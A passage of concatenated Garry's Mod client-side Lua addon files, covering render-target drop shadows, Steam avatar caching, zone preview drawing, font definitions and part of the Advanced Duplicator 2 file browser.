    table.insert(zclib_ClientModelList, ent)

    return ent
end

function zclib.ClientModel.Remove(ent)
    if not IsValid(ent) then return end
    table.RemoveByValue(zclib_ClientModelList, ent)

    // Stop moving if you have physics
    if ent.PhysicsDestroy then ent:PhysicsDestroy() end

    // Hide entity
    if ent.SetNoDraw then ent:SetNoDraw(true) end

    // This got taken from a Physcollide function but maybe its needed to prevent a crash
    local deltime = FrameTime() * 2
    if not game.SinglePlayer() then deltime = FrameTime() * 6 end
    SafeRemoveEntityDelayed(ent, deltime)
end
////////////////////////////////////////////
////////////////////////////////////////////

--PATH addons/zeros_lua_libary/lua/zclib/util/cl_blueshadows.lua:
if SERVER then return end

//This code can be improved a lot.
//Feel free to improve, use or modify in any way although credit would be appreciated.
//Global table
BSHADOWS = {}

//The original drawing layer
BSHADOWS.RenderTarget = GetRenderTarget("bshadows_original", ScrW(), ScrH())

//The shadow layer
BSHADOWS.RenderTarget2 = GetRenderTarget("bshadows_shadow", ScrW(), ScrH())

//The matarial to draw the render targets on
BSHADOWS.ShadowMaterial = CreateMaterial("bshadows", "UnlitGeneric", {
	[ "$translucent" ] = 1,
	[ "$vertexalpha" ] = 1,
	[ "alpha" ] = 1
})

//When we copy the rendertarget it retains color, using this allows up to force any drawing to be black
//Then we can blur it to create the shadow effect
BSHADOWS.ShadowMaterialGrayscale = CreateMaterial("bshadows_grayscale", "UnlitGeneric", {
	[ "$translucent" ] = 1,
	[ "$vertexalpha" ] = 1,
	[ "$alpha" ] = 1,
	[ "$color" ] = "0 0 0",
	[ "$color2" ] = "0 0 0"
})

//Call this to begin drawing a shadow
BSHADOWS.BeginShadow = function()
	//Set the render target so all draw calls draw onto the render target instead of the screen
	render.PushRenderTarget(BSHADOWS.RenderTarget)

	//Clear is so that theres no color or alpha
	render.OverrideAlphaWriteEnable(true, true)
	render.Clear(0, 0, 0, 0)
	render.OverrideAlphaWriteEnable(false, false)

	//Start Cam2D as where drawing on a flat surface
	cam.Start2D()
end

//Now leave the rest to the user to draw onto the surface
//This will draw the shadow, and mirror any other draw calls the happened during drawing the shadow
BSHADOWS.EndShadow = function(intensity, spread, blur, opacity, direction, distance, _shadowOnly)

	//Set default opcaity
	opacity = opacity or 255
	direction = direction or 0
	distance = distance or 0
	_shadowOnly = _shadowOnly or false

	//Copy this render target to the other
	render.CopyRenderTargetToTexture(BSHADOWS.RenderTarget2)

	//Blur the second render target
	if blur > 0 then
		render.OverrideAlphaWriteEnable(true, true)
		render.BlurRenderTarget(BSHADOWS.RenderTarget2, spread, spread, blur)
		render.OverrideAlphaWriteEnable(false, false)
	end

	//First remove the render target that the user drew
	render.PopRenderTarget()

	//Now update the material to what was drawn
	BSHADOWS.ShadowMaterial:SetTexture('$basetexture', BSHADOWS.RenderTarget)

	//Now update the material to the shadow render target
	BSHADOWS.ShadowMaterialGrayscale:SetTexture('$basetexture', BSHADOWS.RenderTarget2)

	//Work out shadow offsets
	local xOffset = math.sin(math.rad(direction)) * distance
	local yOffset = math.cos(math.rad(direction)) * distance

	//Now draw the shadow
	BSHADOWS.ShadowMaterialGrayscale:SetFloat("$alpha", opacity / 255) //set the alpha of the shadow
	render.SetMaterial(BSHADOWS.ShadowMaterialGrayscale)

	for i = 1, math.ceil(intensity) do
		render.DrawScreenQuadEx(xOffset, yOffset, ScrW(), ScrH())
	end

	if not _shadowOnly then

		//Now draw the original
		BSHADOWS.ShadowMaterial:SetTexture('$basetexture', BSHADOWS.RenderTarget)
		render.SetMaterial(BSHADOWS.ShadowMaterial)
		render.DrawScreenQuad()
	end

	cam.End2D()
end

//This will draw a shadow based on the texture you passed it.
BSHADOWS.DrawShadowTexture = function(texture, intensity, spread, blur, opacity, direction, distance, shadowOnly)
	//Set default opcaity
	opacity = opacity or 255
	direction = direction or 0
	distance = distance or 0
	shadowOnly = shadowOnly or false

	//Copy the texture we wish to create a shadow for to the shadow render target
	render.CopyTexture(texture, BSHADOWS.RenderTarget2)

	//Blur the second render target
	if blur > 0 then
		render.PushRenderTarget(BSHADOWS.RenderTarget2)
		render.OverrideAlphaWriteEnable(true, true)
		render.BlurRenderTarget(BSHADOWS.RenderTarget2, spread, spread, blur)
		render.OverrideAlphaWriteEnable(false, false)
		render.PopRenderTarget()
	end

	//Now update the material to the shadow render target
	BSHADOWS.ShadowMaterialGrayscale:SetTexture('$basetexture', BSHADOWS.RenderTarget2)

	//Work out shadow offsets
	local xOffset = math.sin(math.rad(direction)) * distance
	local yOffset = math.cos(math.rad(direction)) * distance

	//Now draw the shadow
	BSHADOWS.ShadowMaterialGrayscale:SetFloat("$alpha", opacity / 255) //Set the alpha
	render.SetMaterial(BSHADOWS.ShadowMaterialGrayscale)

	for i = 1, math.ceil(intensity) do
		render.DrawScreenQuadEx(xOffset, yOffset, ScrW(), ScrH())
	end

	if not shadowOnly then
		//Now draw the original
		BSHADOWS.ShadowMaterial:SetTexture('$basetexture', texture)
		render.SetMaterial(BSHADOWS.ShadowMaterial)
		render.DrawScreenQuad()
	end
end

--PATH addons/zeros_lua_libary/lua/zclib/util/player/cl_player.lua:
if SERVER then return end
// Sends a net msg to the server that the player has fully initialized and removes itself
zclib.Hook.Add("HUDPaint", "PlayerInit", function()

	// Tell the server that we just initialized
	net.Start("zclib_Player_Initialize")
	net.SendToServer()

	// I like to believe this var is used somewhere
	LocalPlayer().zclib_HasInitialized = true

	// Run a custom hook to inform any other clientside script that the players is now initialized
	hook.Run("zclib_PlayerInitialized")

	// Add the player himself to the player list
	zclib.Player.Add(LocalPlayer())

	// Forces zeros libary to reload its image service module
	timer.Simple(1,function() zclib.Imgur.Init() end)

	// Delete this hook now
	zclib.Hook.Remove("HUDPaint", "PlayerInit")
end)

--PATH addons/zeros_lua_libary/lua/zclib/generic/cl_avatar.lua:
if SERVER then return end
zclib = zclib or {}
zclib.Avatar = zclib.Avatar or {}

/*

    Steam avatar downloader taken from > https://github.com/WilliamVenner/glua-material-avatar/blob/master/material-avatar.lua

*/

local AVATAR_IMAGE_CACHE_EXPIRES = 86400 -- 1 day, in seconds
local default = Material("vgui/avatar_default")
function zclib.Avatar.GetMaterial(steamid64, callback)

	if steamid64 == nil then
		return callback(default)
	end

	-- First, check the cache to see if this avatar has already been downloaded.
	-- If the avatar hasn't been cached in data/, file.Time will return 0.
	-- If an avatar material is 1 day old, let's redownload it but use it as a fallback in case something goes wrong.
	local fallback
	if os.time() - file.Time("avatars/" .. steamid64 .. ".png", "DATA") > AVATAR_IMAGE_CACHE_EXPIRES then
		fallback = Material("../data/avatars/" .. steamid64 .. ".png", "smooth")
	elseif os.time() - file.Exists("avatars/" .. steamid64 .. ".jpg", "DATA") > AVATAR_IMAGE_CACHE_EXPIRES then
		fallback = Material("../data/avatars/" .. steamid64 .. ".jpg", "smooth")
	end

	-- If a fallback couldn't be found in data/, default to vgui/avatar_default
	if not fallback or fallback:IsError() then
		fallback = default
	else
		-- Otherwise, if a cached avatar was found, and it hasn't expired, return it!
		return callback(fallback)
	end

	-- Fetch the XML version of the player's Steam profile.
	-- This XML contains a tag, <avatarFull> which contains the URL to their full avatar.
	http.Fetch("https://steamcommunity.com/profiles/" .. steamid64 .. "?xml=1",

		function(body, size, headers, code)
			-- If the HTTP request fails (size = 0, code is not a HTTP success response code) then return the fallback
			if size == 0 or code < 200 or code > 299 then return callback(fallback, steamid64) end

			local url, fileType = body:match("<avatarFull>.-(https?://%S+%f[%.]%.)(%w+).-</avatarFull>") -- Extract the URL and file extension from <avatarFull>
			if not url or not fileType then return callback(fallback, steamid64) end -- If the URL or file type couldn't be extracted, return the fallback.
			if fileType == "jpeg" then fileType = "jpg" end -- Defensively ensure jpeg -> jpg.

			-- Download the avatar image
			http.Fetch(url .. fileType,

				function(body, size, headers, code)
					if size == 0 or code < 200 or code > 299 then return callback(fallback, steamid64) end

					local cachePath = "avatars/" .. steamid64 .. "." .. fileType
					file.CreateDir("avatars")
					file.Write(cachePath, body) -- Write the avatar to data/

					local material = Material("../data/" .. cachePath, "smooth") -- Load the avatar from data/ as a Material
					if material:IsError() then
						-- If the material errors, the image must be corrupt, so we'll delete this from data/ and return the fallback.
						file.Delete(cachePath)
						callback(fallback, steamid64)
					else
						-- We succeeded, return the downloaded avatar image material!
						callback(material, steamid64)
					end

				end,

				-- If we hard-fail, return the fallback image.
				function() callback(fallback, steamid64) end

			)
		end,

		-- If we hard-fail, return the fallback image.
		function() callback(fallback, steamid64) end
	)
end

-- We don't want to fill the user's hard drive up with avatars over time, so we'll clear them whenever they join the server.
-- This also has the added benefit of allowing the user to "manually" regenerate avatars if they so desire.
local function clearCachedAvatars()
    for _, f in ipairs(file.Find("avatars/*", "DATA")) do
        file.Delete("avatars/" .. f)
    end

    hook.Remove("InitPostEntity", "clearCachedAvatars") -- Just to be safe.
end
hook.Add("InitPostEntity", "clearCachedAvatars", clearCachedAvatars)

--PATH addons/zeros_lua_libary/lua/zclib/zone/cl_zone.lua:
if SERVER then return end
zclib = zclib or {}
zclib.Zone = zclib.Zone or {}

net.Receive("zclib_Zone_Send", function(len)
    zclib.Debug_Net("zclib_Zone_Send", len)
    local entryid = net.ReadString()
    local dataLength = net.ReadUInt(16)
    local dataDecompressed = util.Decompress(net.ReadData(dataLength))
    local data = util.JSONToTable(dataDecompressed)

    if data and istable(data) then
        zclib.Zone.Set(entryid,data)
    end
end)

net.Receive("zclib_Zone_Show", function(len)
    zclib.Debug_Net("zclib_Zone_Show", len)
    local entryid = net.ReadString()
	local showall = net.ReadBool()
    zclib.Zone.Preview_Start(entryid,showall)
end)

net.Receive("zclib_Zone_Hide", function(len)
    zclib.Debug_Net("zclib_Zone_Hide", len)
    zclib.Zone.Preview_Stop()
end)

local function HasToolActive(entryid,ply)
    if IsValid(ply:GetActiveWeapon()) and ply:GetActiveWeapon():GetClass() == "gmod_tool" then
        local tool = ply:GetTool()
        if tool and table.Count(tool) > 0 and IsValid(tool.SWEP) and tool.Mode == zclib.Zone.GetToolName(entryid) then
            return tool
        else
            return false
        end
    else
        return false
    end
end

local RenderHook = "HUDPaint"

local CurEntryid
function zclib.Zone.Preview_Start(entryid,showall)

    if zclib.Hook.Exist(RenderHook, "zclib_zone_preview") and CurEntryid == entryid then return end

	zclib.Zone.Preview_Stop()
	zclib.Debug("zclib.Zone.Preview_Start " .. entryid)
    local ply = LocalPlayer()
	CurEntryid = entryid

    zclib.Hook.Add(RenderHook, "zclib_zone_preview", function(bDrawingDepth, bDrawingSkybox, isDraw3DSkybox)
        if isDraw3DSkybox then return end

        if not IsValid(ply) or ply:Alive() == false then
            zclib.Zone.Preview_Stop()
        end

        if HasToolActive(entryid,ply) == false then
            zclib.Zone.Preview_Stop()
        end

        local tr = ply:GetEyeTrace()
        if not tr.Hit or not tr.HitPos then return end

		local npos = zclib.Zone.GetTracePos(entryid, ply, tr)

		cam.Start3D(EyePos(),EyeAngles(),nil,0,0,ScrW(),ScrH(),1,100000000000)

        render.SetColorMaterial()
        render.DrawWireframeSphere( npos, 5,9, 9,zclib.colors["zone_green01"], true )

        if ply.zclib_ZoneStart and npos then
			if zclib.Zone.GetFreeSize(entryid) then
				local zoneSize = zclib.Zone.GetFinalSize(entryid,tr,ply.zclib_ZoneStart,npos)
	            render.SetColorMaterial()
				render.DrawBox(ply.zclib_ZoneStart, angle_zero, vector_origin, zoneSize,zclib.colors["zone_green01"])
	            render.DrawWireframeBox(ply.zclib_ZoneStart, angle_zero, vector_origin, zoneSize,zclib.colors["zone_green01"], true)
			else

				local vec01 = Vector(0, 0,zclib.Zone.GetHeight(entryid) - zclib.Zone.GetExtraHeight(entryid))

				local zoneSize = zclib.Zone.GetSize(entryid,ply.zclib_ZoneStart,npos)

				render.SetColorMaterial()
				render.DrawBox(ply.zclib_ZoneStart - vec01, angle_zero, vector_origin, zoneSize,zclib.colors["zone_green01"])
	            render.DrawWireframeBox(ply.zclib_ZoneStart - vec01, angle_zero, vector_origin, zoneSize,zclib.colors["zone_green01"], true)
			end
        end

        zclib.Zone.DrawAll(entryid,tr.HitPos,function(zone_id,pos)
            return zclib.Zone.Check(entryid,zone_id,tr.HitPos or vector_origin) and zclib.colors["zone_green01"] or zclib.colors["zone_white"]
        end)

		cam.End3D()
    end)

	zclib.Hook.Add("PostDrawTranslucentRenderables", "zclib_zone_preview",function(bDrawingDepth, bDrawingSkybox, isDraw3DSkybox)
		if isDraw3DSkybox then return end

		if not IsValid(ply) or ply:Alive() == false then
			zclib.Zone.Preview_Stop()
		end

		if HasToolActive(entryid,ply) == false then
			zclib.Zone.Preview_Stop()
		end

		local tr = ply:GetEyeTrace()
		if not tr.Hit or not tr.HitPos then return end


		zclib.Zone.DrawAll(entryid,tr.HitPos,function(zone_id,pos)
			return zclib.Zone.Check(entryid,zone_id,tr.HitPos or vector_origin) and zclib.colors["zone_green01"] or zclib.colors["zone_white"]
		end)
	end)
end

function zclib.Zone.Preview_Stop()
    zclib.Hook.Remove(RenderHook, "zclib_zone_preview")
	zclib.Hook.Remove("PostDrawTranslucentRenderables", "zclib_zone_preview")
end

function zclib.Zone.Draw(entry,zone_id,zone_data,size,pos,check,entryid)

    local asize
	if zclib.Zone.GetFreeSize(entryid) then
		asize = Vector(size.x,size.y,size.z)
	else
		asize = Vector(size.x,size.y,((entry.BaseHeight or 200) * 2) + (entry.ExtraHeight or 200))
	end

    local thickPos,thickSize = zclib.Zone.GetThickness(entryid,pos,asize)
    if thickPos and thickSize then
        pos = pos + thickPos
        asize = asize + thickSize
    end

	render.SetColorMaterial()
    local color = check(zone_id,pos)
    if entry.FillZone then
        render.DrawBox(pos, angle_zero, vector_origin, asize, color)
    end
    render.DrawWireframeBox(pos, angle_zero, vector_origin, asize, color, entry.WriteZ == nil and true or entry.WriteZ)

	cam.IgnoreZ(true)
    cam.Start3D2D(pos + (size / 2) + Vector(0, 0, entry.BaseHeight or 200), zclib.HUD.GetLookAngles(), 1)
        entry.DrawZone(zone_id,zone_data)
    cam.End3D2D()
	cam.IgnoreZ(false)
end

function zclib.Zone.DrawAll(entryid,pos,check)
    local entry = zclib.Zone.GetEntry(entryid)
    if entry == nil then return end

	// Overwrites the DrawAll zones function
	if entry.DrawAllOverwrite then
		entry.DrawAllOverwrite(entryid,pos,check)
	else
		for k, v in pairs(zclib.Zone.GetData(entryid)) do
	        if v and v.pos and v.size then
	            zclib.Zone.Draw(entry,k,v,v.size,v.pos,check,entryid)
	        end
	    end
	end
end

////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////

net.Receive("zclib_Zone_ShowSingle", function(len)
    zclib.Debug_Net("zclib_Zone_ShowSingle", len)
    local entryid = net.ReadString()
    local zoneid = net.ReadUInt(16)
    zclib.Zone.DrawSingle(entryid,zoneid)
end)

function zclib.Zone.DrawSingle(entryid,zoneid)

    local entry = zclib.Zone.GetEntry(entryid)
    if entry == nil then return end

    local zonelist = entry.GetData()
    if zonelist == nil then return end

    local zoneData = zonelist[zoneid]
    if zoneData == nil then return end

    local FinishTime = CurTime() + 10

    zclib.Hook.Remove(RenderHook, "zclib_zone_preview")
    local ply = LocalPlayer()
    zclib.Hook.Add(RenderHook, "zclib_zone_preview", function(bDrawingDepth, bDrawingSkybox, isDraw3DSkybox)
        if isDraw3DSkybox then return end

        if not IsValid(ply) or ply:Alive() == false then
            zclib.Hook.Remove(RenderHook, "zclib_zone_preview")
        end

        if CurTime() >= FinishTime then
            zclib.Hook.Remove(RenderHook, "zclib_zone_preview")
        end

        zclib.Zone.Draw(entry,zoneid,zoneData,zoneData.size,zoneData.pos,function() return zclib.colors["zone_red01"] end,entryid)
    end)

	zclib.Hook.Remove("PostDrawTranslucentRenderables", "zclib_zone_preview")
	zclib.Hook.Add("PostDrawTranslucentRenderables", "zclib_zone_preview", function(bDrawingDepth, bDrawingSkybox, isDraw3DSkybox)
		if isDraw3DSkybox then return end

		if not IsValid(ply) or ply:Alive() == false then
			zclib.Hook.Remove("PostDrawTranslucentRenderables", "zclib_zone_preview")
		end

		if CurTime() >= FinishTime then
			zclib.Hook.Remove("PostDrawTranslucentRenderables", "zclib_zone_preview")
		end

		zclib.Zone.Draw(entry,zoneid,zoneData,zoneData.size,zoneData.pos,function() return zclib.colors["zone_red01"] end,entryid)
	end)
end

--PATH addons/zeros_methlab2/lua/zmlab2/util/cl_fonts.lua:
if SERVER then return end

zmlab2 = zmlab2 or {}
zmlab2.LoadedFonts = {}
zmlab2.FontData = {}

function zmlab2.GetFont(id)
	if zmlab2.LoadedFonts[id] then
		// Font already exists
		return id
	else

		// Create Font
		surface.CreateFont(id, zmlab2.FontData[id])
		zmlab2.LoadedFonts[id] = true

		zmlab2.Print("Font " .. id .. " cached!")
		return id
	end
end

////////////////////////////////////////////
///////////////// DEFAULT //////////////////
////////////////////////////////////////////
zmlab2.FontData["zmlab2_font00"] = {
	font = "Nexa Bold",
	extended = true,
	size = 20,
	weight = 100,
	antialias = true
}

zmlab2.FontData["zmlab2_font01"] = {
	font = "Nexa Bold",
	extended = true,
	size = 20,
	weight = 1,
	antialias = true
}

zmlab2.FontData["zmlab2_font02"] = {
	font = "Nexa Bold",
	extended = true,
	size = 50,
	weight = 1,
	antialias = true
}

zmlab2.FontData["zmlab2_font03"] = {
	font = "Nexa Bold",
	extended = true,
	size = 80,
	weight = 1,
	antialias = true
}

zmlab2.FontData["zmlab2_font04"] = {
	font = "Nexa Bold",
	extended = true,
	size = 40,
	weight = 1,
	antialias = true
}


zmlab2.FontData["zmlab2_font05"] = {
	font = "Nexa Bold",
	extended = true,
	size = 30,
	weight = 1,
	antialias = true
}


////////////////////////////////////////////
///////////////// VGUI /////////////////////
////////////////////////////////////////////
zmlab2.FontData["zmlab2_vgui_font00"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(25),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font01"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(15),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font02"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(5.9),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font03"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(10),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font05"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(4.6),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font06"] = {
	font = "Nexa Light",
	extended = true,
	size = ScreenScale(6),
	weight = ScreenScale(100),
	antialias = true
}

--PATH addons/rp_advdupe2/lua/advdupe2/file_browser.lua:
--[[
	Title: Adv. Dupe 2 File Browser

	Desc: Displays and interfaces with duplication files.

	Author: TB

	Version: 1.0
]]

local History = {}
local Narrow = {}

local switch = true
local count = 0

local function AddHistory(txt)
	txt = string.lower(txt)
	local char1 = txt[1]
	local char2
	for i = 1, #History do
		char2 = History[i][1]
		if (char1 == char2) then
			if (History[i] == txt) then
				return
			end
		elseif (char1 < char2) then
			break
		end
	end

	table.insert(History, txt)
	table.sort(History, function(a, b) return a < b end)
end

local function NarrowHistory(txt, last)
	txt = string.lower(txt)
	local temp = {}
	if (last <= #txt and last ~= 0 and #txt ~= 1) then
		for i = 1, #Narrow do
			if (Narrow[i][last + 1] == txt[last + 1]) then
				table.insert(temp, Narrow[i])
			elseif (Narrow[i][last + 1] ~= '') then
				break
			end
		end
	else
		local char1 = txt[1]
		local char2
		for i = 1, #History do
			char2 = History[i][1]
			if (char1 == char2) then
				if (#txt > 1) then
					for k = 2, #txt do
						if (txt[k] ~= History[i][k]) then
							break
						end
						if (k == #txt) then
							table.insert(temp, History[i])
						end
					end
				else
					table.insert(temp, History[i])
				end
			elseif (char1 < char2) then
				break
			end
		end
	end

	Narrow = temp
end

local function tableSortNodes(tbl)
    for k, v in ipairs(tbl) do tbl[k] = {string.lower(v.Label:GetText()), v} end
    table.sort(tbl, function(a,b) return a[1]<b[1] end)
    for k, v in ipairs(tbl) do tbl[k] = v[2] end
end

local BROWSERPNL = {}
AccessorFunc(BROWSERPNL, "m_bBackground", "PaintBackground", FORCE_BOOL)
AccessorFunc(BROWSERPNL, "m_bgColor", "BackgroundColor")
Derma_Hook(BROWSERPNL, "Paint", "Paint", "Panel")
Derma_Hook(BROWSERPNL, "PerformLayout", "Layout", "Panel")

local setbrowserpnlsize
local function SetBrowserPnlSize(self, x, y)
	setbrowserpnlsize(self, x, y)
	self.pnlCanvas:SetWide(x)
	self.pnlCanvas.VBar:SetUp(y, self.pnlCanvas:GetTall())
end

function BROWSERPNL:Init()
	setbrowserpnlsize = self.SetSize
	self.SetSize = SetBrowserPnlSize
	self.pnlCanvas = vgui.Create("advdupe2_browser_tree", self)

	self:SetPaintBackground(true)
	self:SetPaintBackgroundEnabled(false)
	self:SetPaintBorderEnabled(false)
	self:SetBackgroundColor(self:GetSkin().text_bright)
end

function BROWSERPNL:OnVScroll(iOffset)
	self.pnlCanvas:SetPos(0, iOffset)
end

derma.DefineControl("advdupe2_browser_panel", "AD2 File Browser", BROWSERPNL, "Panel")

local BROWSER = {}
AccessorFunc(BROWSER, "m_pSelectedItem", "SelectedItem")
Derma_Hook(BROWSER, "Paint", "Paint", "Panel")

local origSetTall
local function SetTall(self, val)
	origSetTall(self, val)
	self.VBar:SetUp(self:GetParent():GetTall(), self:GetTall())
end

function BROWSER:Init()
	self:SetTall(0)
	origSetTall = self.SetTall
	self.SetTall = SetTall

	self.VBar = vgui.Create("DVScrollBar", self:GetParent())
	self.VBar:Dock(RIGHT)
	self.Nodes = 0
	self.ChildrenExpanded = {}
	self.ChildList = self
	self.m_bExpanded = true
	self.Folders = {}
	self.Files = {}
	self.LastClick = CurTime()
end

local function GetNodePath(node)
	local path = node.Label:GetText()
	local area = 0
	local name = ""
	node = node.ParentNode
	if (not node.ParentNode) then
		if (path == "-Public-") then
			area = 1
		elseif (path == "-Advanced Duplicator 1-") then
			area = 2
		end
		return "", area
	end

	while (true) do

		name = node.Label:GetText()
		if (name == "-Advanced Duplicator 2-") then
			break
		elseif (name == "-Public-") then
			area = 1
			break
		elseif (name == "-Advanced Duplicator 1-") then
			area = 2
			break
		end
		path = name .. "/" .. path
		node = node.ParentNode
	end

	return path, area
end

function BROWSER:DoNodeLeftClick(node)
	if (self.m_pSelectedItem == node and CurTime() - self.LastClick <= 0.25) then -- Check for double click
		if (node.Derma.ClassName == "advdupe2_browser_folder") then
			if (node.Expander) then
				node:SetExpanded() -- It's a folder, expand/collapse it
			end
		else
			AdvDupe2.UploadFile(GetNodePath(node))
		end
	else
		self:SetSelected(node) -- A node was clicked, select it
	end
	self.LastClick = CurTime()
end

local function AddNewFolder(node)
	local Controller = node.Control:GetParent():GetParent()
	local name = Controller.FileName:GetValue()
	if (name == "" or name == "Folder_Name...") then
		AdvDupe2.Notify("Name is blank!", NOTIFY_ERROR)
		Controller.FileName:SelectAllOnFocus(true)
		Controller.FileName:OnGetFocus()
		Controller.FileName:RequestFocus()
		return
	end
	name = name:gsub("%W", "")
	local path, area = GetNodePath(node)
	if (area == 0) then
		path = AdvDupe2.DataFolder .. "/" .. path .. "/" .. name
	elseif (area == 1) then
		path = AdvDupe2.DataFolder .. "/=Public=/" .. path .. "/" .. name
	else
		path = "adv_duplicator/" .. path .. "/" .. name
	end

	if (file.IsDir(path, "DATA")) then
		AdvDupe2.Notify("Folder name already exists.", NOTIFY_ERROR)
		Controller.FileName:SelectAllOnFocus(true)
		Controller.FileName:OnGetFocus()
		Controller.FileName:RequestFocus()
		return
	end
	file.CreateDir(path)

	local Folder = node:AddFolder(name)
	node.Control:Sort(node)

	if (not node.m_bExpanded) then
		node:SetExpanded()
	end

	node.Control:SetSelected(Folder)
	if (Controller.Expanded) then
		AdvDupe2.FileBrowser:Slide(false)
	end
end

local function CollapseChildren(node)
	node.m_bExpanded = false
	if (node.Expander) then
		node.Expander:SetExpanded(false)
		node.ChildList:SetTall(0)
		for i = 1, #node.ChildrenExpanded do
			CollapseChildren(node.ChildrenExpanded[i])
		end
		node.ChildrenExpanded = {}
	end
end

local function CollapseParentsComplete(node)
	if (not node.ParentNode.ParentNode) then
		node:SetExpanded(false)
		return
	end
	CollapseParentsComplete(node.ParentNode)
end

function AdvDupe2.GetFilename(path, overwrite)
	if not overwrite and file.Exists(path .. ".txt", "DATA") then
		for i = 1, AdvDupe2.FileRenameTryLimit do
			local p = string.format("%s_%03d.txt", path, i)
			if not file.Exists(p, "DATA") then
				return p
			end
		end
		return false
	end
	return path .. ".txt"
end

local function GetFullPath(node)
	local path, area = GetNodePath(node)
	if (area == 0) then
		path = AdvDupe2.DataFolder .. "/" .. path .. "/"
	elseif (area == 1) then

	else
		path = "adv_duplicator/" .. path .. "/"
	end
	return path
end

local function GetNodeRoot(node)
	local Root
	while (true) do
		if (not node.ParentNode.ParentNode) then
			Root = node
			break
		end
		node = node.ParentNode
	end
	return Root
end

local function RenameFileCl(node, name)
	local path, area = GetNodePath(node)
	local File, FilePath, tempFilePath = "", "", ""
	if (area == 0) then
		tempFilePath = AdvDupe2.DataFolder .. "/" .. path
	elseif (area == 1) then
		tempFilePath = AdvDupe2.DataFolder .. "/=Public=/" .. path
	elseif (area == 2) then
		tempFilePath = "adv_duplicator/" .. path
	end

	File = file.Read(tempFilePath .. ".txt")
	FilePath = AdvDupe2.GetFilename(
		string.sub(tempFilePath, 1, #tempFilePath - #node.Label:GetText()) .. name)

	if (not FilePath) then
		AdvDupe2.Notify("Rename limit exceeded, could not rename.", NOTIFY_ERROR)
		return
	end
	file.Write(FilePath, File)
	if (file.Exists(FilePath, "DATA")) then
		file.Delete(tempFilePath .. ".txt")
		local NewName = string.Explode("/", FilePath)
		NewName = string.sub(NewName[#NewName], 1, -5)
		node.Label:SetText(NewName)
		node.Label:SizeToContents()
		AdvDupe2.Notify("File renamed to " .. NewName)
	else
		AdvDupe2.Notify("File was not renamed.", NOTIFY_ERROR)
	end

	node.Control:Sort(node.ParentNode)
end

local function MoveFileClient(node)
	if (not node) then
		AdvDupe2.Notify("Select a folder to move the file to.", NOTIFY_ERROR)
		return
	end
	if (node.Derma.ClassName == "advdupe2_browser_file") then
		AdvDupe2.Notify("You muse select a folder as a destination.", NOTIFY_ERROR)
		return
	end
	local base = AdvDupe2.DataFolder
	local ParentNode

	local node2 = node.Control.ActionNode
	local path, area = GetNodePath(node2)
	local path2, area2 = GetNodePath(node)

	if (area ~= area2 or path == path2) then
		AdvDupe2.Notify("Cannot move files between these directories.", NOTIFY_ERROR)
		return
	end
	if (area == 2) then base = "adv_duplicator" end

	local savepath = AdvDupe2.GetFilename(
						 base .. "/" .. path2 .. "/" .. node2.Label:GetText())
	local OldFile = base .. "/" .. path .. ".txt"

	local ReFile = file.Read(OldFile)
	file.Write(savepath, ReFile)
	file.Delete(OldFile)
	local name2 = string.Explode("/", savepath)
	name2 = string.sub(name2[#name2], 1, -5)
	node2.Control:RemoveNode(node2)
	node2 = node:AddFile(name2)
	node2.Control:Sort(node)
	AdvDupe2.FileBrowser:Slide(false)
	AdvDupe2.FileBrowser.Info:SetVisible(false)
end

local function DeleteFilesInFolders(path)
	local files, folders = file.Find(path .. "*", "DATA")

	for k, v in pairs(files) do file.Delete(path .. v) end

	for k, v in pairs(folders) do DeleteFilesInFolders(path .. v .. "/") end

	file.Delete(path)
end

local function SearchNodes(node, name)
	local tab = {}
	for k, v in pairs(node.Files) do
		if (string.find(string.lower(v.Label:GetText()), name)) then
			table.insert(tab, v)
		end
	end

	for k, v in pairs(node.Folders) do
		for i, j in pairs(SearchNodes(v, name)) do
			table.insert(tab, j)
		end
	end

	return tab
end

local function Search(node, name)
	local pnFileBr = AdvDupe2.FileBrowser
	pnFileBr.Search = vgui.Create("advdupe2_browser_panel", pnFileBr)
	pnFileBr.Search:SetPos(pnFileBr.Browser:GetPos())
	pnFileBr.Search:SetSize(pnFileBr.Browser:GetSize())
	pnFileBr.Search.pnlCanvas.Search = true
	pnFileBr.Browser:SetVisible(false)
	local Files = SearchNodes(node, name)
	tableSortNodes(Files)
	for k, v in pairs(Files) do
		pnFileBr.Search.pnlCanvas:AddFile(v.Label:GetText()).Ref = v
	end
end

function BROWSER:DoNodeRightClick(node)
	self:SetSelected(node)

	local parent = self:GetParent():GetParent()
	parent.FileName:KillFocus()
	parent.Desc:KillFocus()
	local Menu = DermaMenu()
	local root = GetNodeRoot(node).Label:GetText()
	if (node.Derma.ClassName == "advdupe2_browser_file") then
		if (node.Control.Search) then
			Menu:AddOption("Open", function()
				AdvDupe2.UploadFile(GetNodePath(node.Ref))
			end)
			Menu:AddOption("Preview", function()
				local ReadPath, ReadArea = GetNodePath(node.Ref)
				if (ReadArea == 0) then
					ReadPath = AdvDupe2.DataFolder .. "/" .. ReadPath .. ".txt"
				elseif (ReadArea == 1) then
					ReadPath = AdvDupe2.DataFolder .. "/-Public-/" .. ReadPath .. ".txt"
				else
					ReadPath = "adv_duplicator/" .. ReadPath .. ".txt"
				end
				if (not file.Exists(ReadPath, "DATA")) then
					AdvDupe2.Notify("File does not exist", NOTIFY_ERROR)
					return
				end

				local read = file.Read(ReadPath)
				local name = string.Explode("/", ReadPath)
				name = name[#name]
				name = string.sub(name, 1, #name - 4)
				local success, dupe, info, moreinfo = AdvDupe2.Decode(read)
				if (success) then
					AdvDupe2.LoadGhosts(dupe, info, moreinfo, name, true)
				end
			end)
		else
			Menu:AddOption("Open", function()
				AdvDupe2.UploadFile(GetNodePath(node))
			end)
			Menu:AddOption("Preview", function()
				local ReadPath, ReadArea = GetNodePath(node)
				if (ReadArea == 0) then
